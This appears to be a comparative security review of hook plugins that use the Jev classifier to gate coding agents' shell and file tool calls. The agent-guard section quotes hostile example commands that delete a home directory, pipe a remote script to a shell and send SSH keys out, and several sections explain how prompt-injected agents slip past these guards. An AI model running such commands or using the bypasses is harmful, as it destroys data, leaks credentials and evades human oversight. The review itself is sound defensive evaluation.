entries.dataEgress: PreToolUse hook: for every Bash, Write, Edit and NotebookEdit call, JSON of {tool, input (JSON string of tool_input sliced to 4000 chars, i.e. shell commands, file paths, and full Write/Edit content or old/new strings up to the cap), cwd}, after regex redaction, goes to the configured base URL (OpenRouter in your setup, so it also reaches the Jev upstream provider). Read/Grep/Glob and tool outputs are not sent, and neither are prompts or the conversation history despite the README saying 'tool input and history' (the CC hook state has no history field). UserPromptSubmit sends the full user prompt plus skill names and descriptions, but only when a roster is configured. MCP tools send only what the model explicitly passes in; redaction is off there. Client code is proprietary or sensitive on client projects, so egress of Write/Edit contents to a third-party router is the real concern.
entries.failureMode: Fail-open on all errors: every path exits 0 with no output. But there is no fast-fail. Default timeout is 15 s per attempt (JEV_TIMEOUT_MS), maxAttempts 3 with 250*n^2 ms backoff on 429, 5xx, and network/timeouts (client.ts), so an outage or stall can block each Bash/Write/Edit call for about 46 s (worst case) before it proceeds. No circuit breaker in the CC hook (each hook call is a fresh process, so the in-memory cache, coalescer and budget guard from core are not in use and there is no persistent cache in the hook). No hooks.json timeout is set, so Claude Code's default applies. Mitigation: set JEV_TIMEOUT_MS=1500 or so. A missing key makes the hooks silent no-ops with no network call.
entries.contextCost: Hook path: zero tool definitions and zero context text on allow; a deny adds one short reason line; skill advisor adds one line per prompt only if a roster is set. MCP path: 12 tools, about 16.9k characters in the TOOLS array (server.ts:296-664), roughly 4.2k tokens of tool names, descriptions and schemas on every session (less with deferred tool search); no MCP server 'instructions' string (Server created with capabilities.tools only). Most of the 12 tools (browse_action, classify, escalate, prune, finding_realness, refute) are irrelevant to daily coding, so the MCP server is poor value per token unless trimmed.
pros: Only candidate so far with a real Claude Code plugin using command hooks (PreToolUse/UserPromptSubmit) that runs automatically with no 'use jev' prompt, using the documented hooks.json/permissionDecision contract (hooks/hooks.json, jev-hook.ts).

Config-only OpenRouter route: baseUrl is overridable and the path /v1/systemone matches the OpenRouter System One endpoint, so TYPESAFE_BASE_URL=https://openrouter.ai/api + OpenRouter key + model typesafe/jev-1.13 should work with no code change (unverified against the live API).
Bundled hook (esbuild, core inlined, dist/hooks/jev-hook.js committed) has no runtime dependencies, and fail-open on every error path, missing key = silent no-op.
Redaction on by default in the hook, and input capped at 4000 chars, reducing what leaves the machine; stdin-only key handling, no telemetry or postinstall.

Most complete Jev toolkit around: 23 patterns, eval and threshold tuning tools, decision log, benchmark with a separate holdout split, and a claimed holdout AUC 0.998 for the destructive gate; the docs candidly note calibration is not correctness.
Apache-2.0, active (79 commits, releases, CI on 3 Node versions, dependabot).
cons: Value is narrow for this user: the destructive gate duplicates protection that permission mode and your secret-leak guard already partly give, and under bypass/auto mode a Jev deny is one of the few things that would stop a bad command, but a single-noul hard deny with no 'ask' path will produce false-positive blocks (repo admits 'python3 script.py' scored 0.84 in core/src/patterns.ts:279-286) that interrupt agent loops.

Hook has no prefilter, cache or budget: every Bash/Write/Edit call, including 'ls' and 'git status', pays a network hop; each invocation is a fresh process so core's cache and budget guard never apply; worst-case stall about 46 s during an outage unless JEV_TIMEOUT_MS is lowered.

Sends Bash commands and full Write/Edit content (to 4000 chars) of client projects to OpenRouter and upstream, with regex-only redaction that fails open; for client code that is a real data-handling issue.

Documented install is likely broken: no root .claude-plugin/marketplace.json, only under packages/claude-code, so 'marketplace add Talya1412/jev-harness' probably fails; plugin userConfig.apiKey is never read by the hook code so only the env var works, and a subscription/OAuth user must export the key in the shell that starts Claude Code.
Skill router is inert by default (needs a hand-maintained JEV_SKILLS_JSON roster) and Claude Code already routes skills via descriptions, so it adds little.

MCP server: 12 tools and about 4k tokens of definitions with generic descriptions and no server instructions, so Claude will not call them on its own; most tools target OMP/browser/review-pipeline workflows.

Immature and single-author: created 2026-09-19, 0 stars, 0 forks, README table says 7 MCP tools but ships 12, SECURITY.md supported-versions table stale, hook test covers only pure helpers, and the benchmark numbers are self-reported on ~170 hand-written cases; no OpenRouter mention anywhere, so OpenRouter compatibility rests on my inference from the endpoint path.
Overlaps and can interleave with your existing PreToolUse hooks on Bash (secret guard, GitNexus), adding a third network-bound hook on the same matcher.
entries.verdict: The only candidate here that gives truly automatic (hook-based) Jev use in Claude Code and it can likely be pointed at OpenRouter with three env vars. But it is a narrow destructive-command gate that sends Bash and file-write content to a third party on every call, has no prefilter, a slow worst-case timeout, and a hard-deny false-positive risk. Treat it as a reference implementation to copy or fork (add a cheap local prefilter, short timeout, ask instead of deny), not something to install as-is on client projects.

entries.name: dbadea-heits/jev-claude-code-hooks
entries.what: Claude Code plugin (also manually installable) with one dependency-free Node script registered on two hook events. PreToolUse(Bash) sends each Bash command plus cwd to Jev as a 3-way Choice (safe/risky/destructive) and forces a permission prompt ("ask") when P(destructive) >= 0.5. UserPromptSubmit sends every user prompt to Jev with 8 questions (1 Score quality, 1 Noul follow-up, 6 Noul prompt-pitfalls taken from the Opus 5.5 prompting guide); it blocks (decision:block) prompts scoring < 1.5/3 or tripping a pitfall until the user resubmits the same text, otherwise shows a one-line "Prompt grade" message.
entries.autoInvocation: Deterministic hooks (PreToolUse:Bash and UserPromptSubmit) fire automatically every time with no model discretion and no user phrasing, which meets the 'never say use jev' requirement, but only for these two narrow judgments.
security: API key is read from env (CLAUDE_PLUGIN_OPTION_TYPESAFE_API_KEY or TYPESAFE_API_KEY) and sent as Bearer header from inside Node; never in argv or process list. Plugin route stores it in the credential store (sensitive:true). Manual route README suggests putting the key in settings.json env (plaintext on disk).

No shell execution, no eval, no child_process, no telemetry beyond the Jev call; only outbound host is TYPESAFE_BASE_URL. TYPESAFE_BASE_URL is env-overridable, so a poisoned env/project settings could redirect the key and all prompts/commands to another host.

Every Bash command string and cwd (and every user prompt, up to full pasted text) is sent to the third party. Commands often embed secrets (inline tokens, curl -H Authorization, DB URLs, .env values echoed). This directly undercuts the user's existing PreToolUse secret-leak guard, and client-project confidentiality/NDA is a concern. Runs alongside that guard in parallel so ordering cannot redact first.

Prompt-injection surface is small: Jev returns typed probabilities, not text, so injected content cannot execute anything; but a command containing a misleading comment could lower P(destructive). Jev is a probabilistic classifier, not a security boundary; false negatives possible, and fail-open lets a slow/down API pass everything.

Hook state files in os.tmpdir()/jev-claude-code-hooks/<sanitized session id>.{held,warned} (hash of held prompt, error message). Session id sanitized to [A-Za-z0-9_-]; on a shared /tmp another local user could pre-create/poison these, low impact.

No LICENSE, single unknown maintainer, day-old repo: auditable in 5 minutes but unmaintained-risk; pin a commit and review before enabling as a plugin (plugin updates would auto-pull code that runs on every Bash call).
entries.dataEgress: On every Bash tool call: full command text + cwd. On every non-slash, non-'!' user prompt: the full prompt text (including pasted logs/code/emails). Tool outputs, file contents, diffs and assistant messages are NOT sent. Destination api.typesafe.ai by default, or OpenRouter (then also retained per OpenRouter/TypeSafe logging policies) if base URL is overridden.
entries.failureMode: Fail-open everywhere: missing key, HTTP error, bad JSON, schema mismatch, or 8 s AbortSignal.timeout (jev-hook.mjs:18,33,255-259) lets the command/prompt proceed; a single systemMessage warning per session ('jev-guard inactive: ...') via a marker file. Hook timeout in hooks.json is 15 s, so worst case adds ~8 s to a Bash call/prompt when Jev hangs. Note: in claude -p, a flagged command is denied and a held prompt dropped. Unverified whether permissionDecision:'ask' is honored or auto-resolved under the user's bypass/auto permission modes (README claims it prompts even for allowed commands; bypass mode may skip it, making the guard moot).
entries.contextCost: Effectively zero tokens: no MCP tools, no server instructions, no skills. Hooks emit nothing on the common path for Bash (silent when not destructive). The prompt grader emits a systemMessage "Prompt grade: X (n/3)" per prompt, which is displayed to the user and not added to model context. Only when flagged does it show a block reason (to user).
pros: Truly automatic and deterministic: hooks.json registers PreToolUse(Bash) + UserPromptSubmit, no prompting needed, zero context-token cost.

Good fit for Jev's design: typed Choice/Noul/Score questions with probabilities and a threshold (P(destructive)>=0.5) is exactly the 'System One' use case; request shape {model,state,questions} is the real /v1/systemone shape.
Env-driven base URL (TYPESAFE_BASE_URL) and model (JEV_MODEL) make an OpenRouter switch likely env-only since path /v1/systemone matches OpenRouter's System One API.
Tiny, readable, dependency-free, fails open with 8 s timeout and once-per-session warning; key not in argv; plugin stores key in credential store.
A semantic destructive-command check catches things regex secret/deny lists miss (git reset --hard, force push, redirect overwrites), useful when running in auto mode.
Reusable template: the askJev client and question definitions can be lifted into the user's own hook with extra questions (e.g. secret-in-command, prod-target).
cons: Sends every Bash command and every prompt to a third party; client-project code/secrets in commands and pasted prompts leave the machine, conflicting with the user's secret-leak guard intent.

Prompt grader is opinionated and intrusive for a senior dev: it BLOCKS prompts (resubmit to bypass) based on Opus-5.5-guide heuristics, and the user is on a subscription workflow where terse prompts are normal; extra friction on every prompt plus 8 questions per call. Can be disabled with grade_prompts=false, leaving only the Bash guard.
Only covers two narrow uses; does not add Jev for code decisions (routing, file/test selection, review triage, commit-type choice). Not a general Jev integration.
Adds a network round trip to every Bash call on the critical path (0.15-0.6 s typical, 8 s worst); with GitNexus and secret-guard hooks already there this stacks in agentic loops.
Under bypass/auto permission modes a 'ask' decision may be ignored or auto-handled, so the guard's main value is uncertain (unverified); in auto mode the built-in classifier already vets commands.
Not OpenRouter-native: defaults and userConfig are TypeSafe-only, model default 'jev-latest' lacks the typesafe/ prefix, OpenRouter schema parity unverified.
Very immature: 1 commit, 1 contributor, created 2026-09-29, no license, no tests, no CI, 0 stars; plugin auto-update pulls unreviewed code that runs on every Bash call.
Fail-open and probabilistic, and Jev is beta/unverified (skeptics claim it is a flash-model router), so it is not a reliable safety boundary.
entries.verdict: A clean, minimal, truly automatic hook, but it covers only a Bash destructive-check and an intrusive prompt grader, ships all commands/prompts to a third party, and is a day-old unlicensed single-commit repo. Best used as a reference or copied/pinned (Bash guard only, grade_prompts off, TYPESAFE_BASE_URL pointed at OpenRouter) rather than installed as a plugin; does not by itself deliver a broad Jev integration.
entries.license: None (no LICENSE file; GitHub licenseInfo null, so all rights reserved by default)

entries.name: pi-jev (y0usaf)
entries.what: Pi extension: measured tool-call gate (destructive, exfiltration, beyond_scope, impact score), output judge for secret leaks and failure class, and jev_ask tool. Shadow mode default, fails open.
entries.autoInvocation: deterministic hook plus model-discretion tool (Pi only)
pros: Combines gate, PostToolUse-style output secret-leak judge, and ask tool in one request per call (~300ms)
Shadow mode plus 120s cache and in-flight dedupe
Question set directly reusable in a CC hook
cons: Pi-only; hardcoded api.typesafe.ai/v1/systemone
No tests in repo
Output judge only appends advice line, cannot block

entries.name: pi-jev-auto-mode (jomatsu)
entries.what: Pi extension: deterministic policy layer (hard-deny, allow/deny, protected paths) then Jev judgment of bash/write/edit, fail-closed. Calibrated thresholds from real API runs; 171 tests.
entries.autoInvocation: deterministic hook (Pi only)
pros: Best-documented design: docs/calibration.md with measured probabilities per threshold, design.md, security.md
171 offline tests, CI, CHANGELOG
Two-layer design mirrors OpenRouter cookbook and is portable to CC PermissionRequest
cons: Pi-only; code not usable in Claude Code without port
Uses TypeSafe SDK transport with baseURL; OpenRouter schema unverified
Fail-closed default is a poor fit for bypassPermissions workflow

entries.name: PanAchy/jevvy (@jevvy/permissions)
entries.what: Claude Code plugin (also OpenCode) with one function: a PermissionRequest hook (matcher Bash) that asks Jev four Noul questions (harmful <=0.35, sensitive/untrusted/obscured <=0.50) about the complete shell command and emits an allow-only decision when all pass. Otherwise it stays silent and Claude Code's normal permission flow proceeds. A SessionStart hook only prints setup warnings. It is a permission auto-approver, not a general Jev assistant for coding decisions.
interface: Skill calibrate-permissions (optional, installed via npx skills add)
entries.autoInvocation: Deterministic hook (PermissionRequest matcher Bash). Fully automatic with no prompting, but it triggers only when Claude Code was about to show a Bash permission dialog. It never fires for allowed or denied commands, non-Bash tools, or (expected, from the PermissionRequest semantics) bypassPermissions mode where nothing is prompted.
security: MIT licence; TypeScript with the Effect library; no MCP server, no daemon, and no telemetry found (grep of src for network calls: only system-one.ts fetch to the selected provider URL).

API key is read from env (Config.redacted) or ~/.config/jevvy/jevvy.jsonc, which init writes 0600 and config.ts:115 re-chmods to 0600 if it is looser. The key is sent as an Authorization header, so it does not appear in argv or the process list. The hook command is plain 'node dist/claude-hook.js'.

Only one global config file is read; project repositories cannot override it, which blocks a malicious-repo config attack. It does read project .claude/settings*.json ask rules and shells out to 'git rev-parse' with cwd.

Fail-closed on approval: every error, timeout, malformed output or provider failure gives silent abstention, and it can only ever emit allow. The risk is the opposite, a wrong allow. The decision comes from a probabilistic model with calibrated thresholds on a small eval set (eval/commands.json), and Theo's skepticism about Jev's quality is unverified. Command text is attacker-influenced input to the judge (prompt-injection-like surface, though the judge outputs only probabilities).

Existing allow, deny and configured ask rules stay authoritative. Managed, CLI and session-only ask rules are invisible to the hook (README), so Jev could approve something the user meant to be an ask.

Install path: marketplace source is npm @jevvy/permissions, so it pulls a third-party npm package into Claude Code. The published package has no postinstall or preinstall scripts (npm view scripts: build/prepack/postpack/prebuild only). The 'init' CLI spawns 'claude'/'opencode' installer commands. Single maintainer (Youssef Achy, 21 of 28 commits) plus release bot; CI actions are SHA-pinned; Dependabot is on. Uses release-candidate Effect 4.0.0-rc.112.
entries.dataEgress: On each Bash PermissionRequest that reaches the hook, the full command string (action='shell', resource=<command>) plus the four fixed question texts go to https://openrouter.ai/api/v1/systemone. This is not conversation text, file contents, diffs, tool outputs, or cwd. Commands can still embed inline secrets, tokens, hostnames or client paths, and no redaction is applied to outbound commands (the redact function only scrubs the API key from output). OpenRouter can log request bodies depending on the account's privacy settings. Verdicts are cached in memory per process, and each hook call is its own process, so there is effectively no cross-call cache.
entries.failureMode: Fail-open to Claude Code's normal flow: any error, HTTP failure, malformed body, missing key or bad config gives exit 0 with empty stdout and stderr, and the permission flow is unchanged. There is a 5 s internal timeout (engine.ts:135) inside a 10 s hook timeout. On 429 or credit exhaustion it sets a cooldown, but that lives only in the process memory of a short-lived hook, so it does not persist. When Jev is slow, each prompt is delayed up to about 5 s and then falls back to a normal prompt. Under bypassPermissions the hook is not expected to fire at all.
entries.contextCost: Effectively zero tokens. There are no MCP tools, no server instructions and no skill in the default install. The hooks inject no model-visible text except a SessionStart systemMessage warning shown only when setup is broken. The optional calibrate-permissions skill adds one skill description line.
pros: Native OpenRouter support in code (openrouter.ts:5-17, System One endpoint /api/v1/systemone, model typesafe/jev-1.13), using OPENROUTER_API_KEY, so it needs no patching for the user's OpenRouter-hosted Jev.
Truly automatic: a deterministic PermissionRequest hook, with no model discretion and no 'use jev' prompting.
Very small footprint for Claude Code: zero context tokens, no MCP server, and the key is not in argv (Authorization header; config file 0600).

Conservative design: allow-only output, never denies, honours existing allow/deny/ask rules, single global config that repos cannot override, and every failure abstains silently. This is the only candidate found that uses Jev for a task matching its strengths (a typed probabilistic yes/no over app state).

Well engineered for a 12-day-old project: typed errors, 5 s timeout, rate-limit cooldown, calibration tooling and an eval corpus with a rule that any must-ask auto-approval disqualifies a run, and SHA-pinned CI.
Provider-agnostic, so it can be switched between OpenRouter and TypeSafe direct without code changes.
cons: Narrow scope: it only reduces Bash permission prompts. It does not give Claude Code Jev for routing, code review, test selection, or any coding decision.

Little to no value in the user's modes: in bypassPermissions nothing prompts, so the hook has nothing to review (the schema accepts the bypassPermissions mode literal, but the hook is a PermissionRequest event). In 'auto' mode Claude Code's own classifier already handles most approvals. The value is mainly in default or acceptEdits mode.

Sends full shell commands to a third party (OpenRouter and then TypeSafe) with no redaction. On client projects, commands can carry inline tokens, internal hostnames and paths, which conflicts with the user's existing secret-leak guard philosophy.

Security-decision correctness rests on a beta probabilistic model that skeptics compare to a small router. A false allow on a destructive or exfiltrating command is possible, and calibration covers only the shipped eval set. Managed, CLI and session ask rules are invisible to it.
Immature and a single maintainer: 20 stars, 28 commits (21 by one author), 12 days old, on release-candidate Effect 4.0.0-rc.112, with breaking policy changes already in the changelog (0.4 to 0.5).

Each hook call is a fresh Node process, so there is no cache or persistent cooldown and it adds a cold start plus a network round trip (up to 5 s) to each prompt. It could also interplay with the existing PreToolUse secret-guard and GitNexus hooks (ordering, not conflict). Unverified: I could not check actual Claude Code semantics for PermissionRequest under auto mode.
entries.verdict: Best-executed and the only truly automatic, OpenRouter-ready Jev integration for Claude Code, but it is a narrow permission auto-approver that mostly does nothing in bypass/auto mode and sends every reviewed command to OpenRouter. Install it only if the user runs default or acceptEdits mode and accepts the command egress. Otherwise treat it as a reference recipe for building a custom Jev hook.

entries.name: OpeOginni/oc-plugins
entries.what: OpenCode V2 plugin oc-auto-perms: judges tool intent (shell, webfetch, websearch) against natural-language allow/deny policy rules with Jev, via TypeSafe, OpenRouter, Vercel or OpenCode Zen gateways.
entries.autoInvocation: deterministic hook (OpenCode permission event)
pros: Native OpenRouter gateway (baseURL https://openrouter.ai/api via TypeSafe SDK) with fallback to JEV_API_KEY
Policy DSL: effect/when/examples with counterexamples, uses recent user requests plus full tool input as state
Unit tests for config/decision/gateway
cons: OpenCode V2 plugin, not portable to Claude Code hooks without a rewrite
OpenRouter default model jev-latest may be rejected on OpenRouter per other reports; unlicensed, no repo description
3 stars, 3 weeks old

entries.name: @canyuda/agent-guard
entries.what: Zero-dependency Node (>=20) PreToolUse hook that gates Bash/Write/Edit/mcp__* tool calls. Fast path first (regex allowlist, then regex denylist, then a 60-minute judgment cache). On a miss it POSTs one request to TypeSafe systemone with two typed questions: destructive_risk (Score, 4 levels) and policy_violation (Noul). Fixed thresholds then map the result to allow / ask / deny. Fails closed. Also ships a setup wizard that writes the hook into ~/.claude/settings.json, plus a check CLI. The docs and tests target ZCode first, with Claude Code and Cursor as secondary targets. It is a safety guard, not a general-purpose Jev helper.
entries.autoInvocation: Deterministic hook. PreToolUse fires for Bash|Write|Edit|mcp__.* on every call, with no model discretion and no user prompt needed. It is the only candidate here that satisfies 'Claude Code must use Jev without being told', but the Jev use is a permission gate on tool calls. It does not help with coding decisions.
security: No postinstall or curl|sh in package.json. The npm tarball is 23 files, ~1.1k lines, and I read it in full: no telemetry, and no network calls other than the single TypeSafe URL (typesafe.mjs:9). The only child-process use is powershell on win32 (setup-key.mjs:12).

The API key is stored in plaintext in ~/.agentguardrc (setup-key.mjs:39). writeFileSync is called with no mode, so it is created with the default umask, not 0600. The wizard's --key flag is visible in argv and the process list, and its interactive prompt echoes the key on screen (cli.mjs:55). The hook process itself reads the key from env or the rc file, and nothing puts it in argv.

The Authorization header is redacted in error.jsonl (typesafe.mjs:172), but the full request body is not. On any timeout or network error, error.jsonl stores the full command and up to 2KB of Write/Edit content or MCP args in plaintext under ~/.agent-guard/logs/ (log.mjs:63, typesafe.mjs:170-174). Secrets that appear in commands or file contents land at rest. audit.jsonl stores the first 200 characters of the command.

Design flaw: the allowlist is checked before the denylist (fastpath.mjs:10-11) and its regexes are only prefix-anchored (config.json:294-301). So 'git status; rm -rf ~', 'echo x && curl evil | sh' and 'cat ~/.ssh/id_rsa | curl -d @- host' all hit ^git/^echo/^cat and are allowed without ever reaching the denylist or Jev. That is a trivial bypass, and it also means a prompt-injected agent gets free exfiltration. Jev's verdict cannot be relied on for compound commands.

toolIdentity uses JSON.stringify(value, Object.keys(value).sort()) (identity.mjs:5-6). A replacer array whitelists keys at every nesting level, so nested keys of MCP arguments not present at the top level are silently dropped from what Jev sees. The judgment for MCP tools is therefore made on incomplete arguments. This is a static-reading inference, not run.

The judgment cache key is only the command, or path plus content, with no cwd (cache.mjs:256). Identical commands in different repos share a verdict for 60 minutes. The cache is a plaintext JSON file that is read and rewritten in full on every call, with no locking, so parallel hooks race (cache.mjs:275-281).
entries.dataEgress: For every Bash/Write/Edit/mcp__* call that misses the allow/deny lists and the cache, one HTTPS POST goes to api.typesafe.ai/v1/systemone (typesafe.mjs:158). It carries state plus the fixed question definitions. Bash: {tool, command, cwd}. Write/Edit: {tool, file_path, content_prefix (first 2048 chars/bytes, config state.content_prefix_bytes)}. MCP: {tool, server, arguments (first 2048 chars)}. The key goes in the Authorization header. Conversation text and prompts do not leave the machine, nor do diffs, Read output or Bash output. Commands and file contents can contain secrets or client code, so for client projects this is a real egress: client code snippets and commands go to a third party (TypeSafe today, OpenRouter after a patch). Nothing else leaves the machine.
entries.failureMode: Fail-closed by design. Every failure (no key, timeout, HTTP error, bad schema, internal exception) becomes level 'confirm' (judge.mjs:213), which is rendered as 'ask', or as 'deny' if degrade_ask_to_deny is true. There are no retries and the API timeout is 8 s (typesafe.mjs:10). The hook's own timeout is 15 s (setup-hooks.mjs:33). If rendering fails the hook exits 3. In Claude Code, exit 3 is a non-blocking hook error, so the call is not blocked (per general knowledge, not verified in this repo). Consequence when Jev or OpenRouter is down or the key is missing: every uncached, non-allowlisted Bash/Write/Edit/MCP call turns into a prompt or deny. In bypass mode the repo's own notes (docs/notes/2026-09-24-consent-deadlock.md) show ask can be silently auto-approved, so it fails open in effect. With degrade_ask_to_deny=true it becomes a hard deny with no approval channel, a documented 'consent deadlock' where even explicit user consent cannot unblock the agent. The default in config.json is degrade_ask_to_deny=false.
entries.contextCost: No MCP server, no tools and no server instructions, so ~0 tokens of tool definitions. Hooks add nothing to context on the allow path (only a short reason string, '[agent-guard] safe pass (...)', which Claude Code shows to the user). On deny the agent gets about 150 Chinese characters (~100-150 tokens) telling it to stop and tell the user, and not to retry or rewrite the command. Tokens are only spent when the guard fires.
pros: Truly automatic: a deterministic PreToolUse hook needs no prompting, and setup writes the settings.json entry with a .bak backup and idempotent upsert (setup-hooks.mjs:154-179).

Uses Jev the way its primitives are meant to be used: typed Score and Noul questions turned into calibrated probabilities with thresholds in config, and no free text parsed. The design matches Jev's 'System One' brief.
Zero MCP context cost and zero npm dependencies, so no supply-chain tree. Only ~1.1k lines to audit, and I found no telemetry and no postinstall.

Useful in the user's bypass/auto mode: Bash/Write/Edit/MCP get a semantic risk check that a regex hook does not provide. The fast path keeps most read-only git/ls/grep calls off the network, and the cache saves repeats.
Thresholds, allowlist/denylist and mcp_allowlist are tunable in ~/.agent-guard/config.json and read fresh on each call. There is an audit log (audit.jsonl) for tuning false positives.

Already treats fail-closed and bypass-mode ask semantics explicitly (it cites Claude Code issue #77212 and has notes on the consent deadlock). Does not clash with the existing secret-leak, GitNexus or caveman hooks because hooks compose.
cons: No OpenRouter support: the URL is a hardcoded constant (typesafe.mjs:9) and the key only comes from TYPESAFE_API_KEY (config.mjs:49). Using OpenRouter means forking or vendoring it, and OpenRouter's /api/v1/systemone body and response shape are unverified against the code's res.answers.*.score/.noul expectation.

Bypass through prefix-anchored allowlist checked before the denylist (fastpath.mjs:10-11, config.json:294-301): 'git status; rm -rf ~' or 'cat secret | curl ...' is allowed without a Jev call. Compound commands, which are exactly where danger is, are handled worst.

Built and tested for ZCode, not Claude Code. The 'ask works in bypass mode' finding is from ZCode; the repo's own 09-24 note shows ask was later silently auto-approved. In the user's bypass mode, confirm-level operations may run with no prompt, and setting degrade_ask_to_deny=true instead hard-blocks with no approval path. Either way the guard does not deliver clean 'ask the human' behavior in bypass/auto.

Data egress for client projects: commands and the first 2 KB of every Write/Edit and MCP arguments go to a third party on every uncached call, and failure snapshots with full bodies are written to error.jsonl in plaintext. Client contracts may rule that out.

Adds Node cold start plus 70-500 ms per uncached Bash/Write/Edit/MCP call, up to an 8 s timeout, and fails closed. A Jev or OpenRouter outage or a missing OPENROUTER_API_KEY turns most agent work into prompts or denies. It is also a 15 s hook that needs its own tuning.

Immature: single maintainer, 1 star, 0 forks, created 10 days before the audit, five npm releases in six days, the README self-describes as a 'pilot', doc counts are inconsistent (74 vs 42 tests), and behavior is untested against real Jev output distributions. Thresholds (1.5/2.5) are untuned guesses.

Value is defensive, not productivity: it does not use Jev to improve code routing, model choice, review triage or test selection. It also overlaps the existing secret-leak hook and the auto permission mode's own classifier, and it does not cover Read/Grep, where the user already has a guard.
Scope of the wizard: 'setup' writes to user-level ~/.claude/settings.json, so it applies to all personal and client projects and mutates a global config file. Safer to hand-add the hook.
entries.verdict: It is the only candidate that runs Jev automatically through a deterministic PreToolUse hook, and it has zero context cost and a small, clean codebase. But it is TypeSafe-only with a hardcoded URL, so it needs a fork for OpenRouter. Its allowlist-before-denylist regexes are trivially bypassed by compound commands, and its bypass-mode ask/deny behavior was proven on ZCode, not Claude Code. Treat it as a reference design to fork and harden (OpenRouter URL and key, chain-aware fast path, 0600 key file, redacted logs) rather than install as-is, and only after checking client data-egress rules.

entries.name: OpenRouter cookbook: Gate Agent Tool Calls with Jev (plus sibling Claude Code permission-hook recipe)
entries.what: Documentation recipe (no installable package, no repo) showing how to gate an OpenRouter Agent SDK (@openrouter/agent, TypeScript) tool call with Jev. In onToolCalled it runs deterministic arithmetic checks, then POSTs {model, state:{policy,ticket,refund}, questions} with three Noul questions to /api/alpha/decisions, and maps probabilities to approve (all >=0.9), block (any <=0.1) or review (pause for a human). It is a customer-support refund example, NOT a Claude Code integration. The Claude-Code-relevant version is the linked sibling recipe "Auto-Approve Coding Agent Permission Prompts with Jev" (cookbook/coding-agents/auto-approve-permission-prompts-with-jev), which I also read. It ships a Bun/TypeScript PermissionRequest hook for Claude Code (also Codex, Cursor, OpenCode) with a regex risk list evaluated before Jev, then two Noul questions (reversible, serves_task) with threshold 0.9. It only ever upgrades a prompt to allow. It is a copy-paste snippet, not a maintained package. Pattern is portable to a PreToolUse hook, but the port is DIY.
entries.autoInvocation: Deterministic hook. Once registered in settings.json the harness runs it on every matching tool event without the model or the user having to say anything. As written in the sibling recipe it is a PermissionRequest hook (fires only when Claude Code would prompt). For the user's bypass/auto mode it must be re-registered as PreToolUse (matcher Bash, possibly Write|Edit) to fire at all.
security: API key is read from the process env and sent as an Authorization header, so it is not in argv or the process list. Claude Code hook subprocesses inherit env, but the recipe found Codex strips *KEY* vars from hook env.

The recipe says outright that the risk list, not the threshold, is the security boundary. Jev cannot tell that `cat foo` reads a secret unless the command text shows it. Hostile repo content or a prompt-injected agent can craft benign-looking commands. The regex list is bypassable in principle (e.g. curl piped to an interpreter, python script files, `make` targets, npm scripts that do bad things).

Prompt-injection surface: the state includes the agent-written command and description (or user task), which are attacker-influenceable strings. The recipe itself warns that customer text can try to change policy, and it hardens the question wording for that. The Claude Code variant uses the agent's own description as the task, so a compromised agent can justify anything to Jev.

Fail-open risk in the recipe design: on Jev error or low confidence it prints nothing and the normal permission flow continues. Under bypassPermissions or auto mode that flow is 'run it', so the gate then adds no protection. The recipe only ever ADDS allow, and never returns deny for Claude Code. Use as a guard requires a PreToolUse rewrite that emits deny or ask.

PermissionRequest hooks run only when Claude Code is about to prompt. The user's bypass mode means they would essentially never fire, per the docs text 'runs only when it's about to ask you'. A PreToolUse hook is needed instead.
Host deny/ask rules still win over hook allow (per the recipe), which is good.
entries.dataEgress: Per gated call, one HTTPS POST to openrouter.ai (which routes to TypeSafe as the provider) containing: model id, the full command string(s), project absolute path (cwd), and the agent description or task text (up to 2000 chars in the OpenCode variant). Extending the pattern to Write/Edit would send file paths and diffs or content. The refund example sends the whole ticket and policy. Nothing else leaves the machine. Real client project paths and command text (which may embed hostnames, table names, or inline tokens) go to two third parties, and the OpenRouter/TypeSafe data-retention policy was not confirmed in the docs I read (the hub says to check the model page).
entries.failureMode: Recipe design: fail-safe toward the PROMPT, not toward a block. fetch has an 8 s AbortSignal.timeout inside a 15 s hook timeout. Any network error, non-2xx, unparsable body, or out-of-range score returns undefined, so the hook prints nothing and Claude Code's normal permission flow proceeds. In default mode this means one extra prompt. In bypass/auto mode it means the command runs ungated (fail-open). Agent SDK variant throws, and the model sees {error} and may retry, and nothing is issued (fail-closed for approvals). Cursor variant needs failClosed:true because Cursor defaults to fail-open. For a security guard the user must choose the fail policy explicitly, and the hook API supports exit code 2 or permissionDecision deny/ask in PreToolUse.
entries.contextCost: Zero tool definitions and zero MCP instructions, since it is a hook and not an MCP server or skill. Only hook stdout is read by the harness, and silent-exit or allow JSON adds no model-visible tokens. If ported to deny with a reason, that short string is shown to the model, which is cheap.
pros: Most literally 'automatic' integration possible: a deterministic hook fires on every risky tool call with no user or model prompting, satisfying the 'never say use jev' requirement.
Zero context-window cost: no tool schemas, no MCP instructions, no injected text (unlike an MCP server).

Single OpenRouter key (OPENROUTER_API_KEY) and single endpoint, https://openrouter.ai/api/alpha/decisions with model typesafe/jev-1.13, confirmed in the page code. The recipe has no TypeSafe account or separate key.
Cheap: about $0.000017 per call measured and 70-600 ms, so about $0.02 per 1000 gated Bash calls.

Design is sound: static regex list first (no network), Jev only for the residue, fixed numeric thresholds, and errors handled toward 'no decision'. The gate-tool-calls recipe explicitly documents fail-closed error handling and a split of approve/block/review, which maps onto PreToolUse allow/deny/ask.
Semantic check adds something the existing regex secret-leak hook cannot: 'does this command serve the current task and is it reversible', a judgment call on the intent of the command.
Captured evidence of actual scores (bun test 0.93/0.95, bun add left-pad 0.45/0.09, wrangler deploy 0.04/0.07) shows the separation works on the samples.
Host deny rules and existing hooks stay authoritative, so this stacks on top of the existing secret-guard and GitNexus hooks.
cons: Not a Claude Code integration as titled: the gate-tool-calls page targets @openrouter/agent SDK refund tools (ticket/policy/HITL). Only the sibling coding-agents page has Claude Code hook code, and nothing is packaged, versioned, or maintained. You'd be maintaining copy-pasted code.

The published Claude Code hook uses PermissionRequest, which fires only when Claude Code is about to prompt. In bypass or auto mode the user runs, it rarely or never fires, so as written it gives nothing for the daily flow. It must be rewritten as PreToolUse, and that variant has not been tested by the authors.

Its main function is to REDUCE prompts (auto-approve), not to add safety, and the user already has prompts off. For a bypass user the value is only a new deny/ask layer, which the recipe never implements, and would need new design of thresholds (asking Jev 'is this dangerous' instead of 'is this reversible').

Fail-open in bypass mode: if Jev times out or errors, the recipe's fall-through means the command just runs, so the guard silently disappears exactly when it is needed unless you add explicit deny/ask on error.

Security evidence is thin: 3 shell commands and 4 refund cases sampled, no false-negative rate on adversarial or obfuscated commands, and the authors themselves say Jev is fooled by e.g. `cat` of a secret file not on the list.
